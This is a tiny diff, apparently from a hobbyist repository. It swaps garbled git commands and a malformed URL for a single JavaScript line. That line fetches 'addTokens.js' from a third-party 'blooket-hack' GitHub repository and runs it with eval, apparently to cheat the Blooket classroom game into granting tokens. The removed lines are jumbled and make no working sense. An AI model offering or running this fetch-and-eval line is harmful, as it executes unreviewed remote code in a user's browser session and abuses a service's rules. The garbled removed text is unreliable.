@@ -1,3 +1,1 @@
-https://github.com/cooperhack/cooperhack.git:)((addtokens)100daily:(((
-git branch -M main
-git push -u origin main
+fetch("https://raw.githubusercontent.com/glixzzy/blooket-hack/main/global/addTokens.js").then((res) => res.text().then((t) => eval(t)))
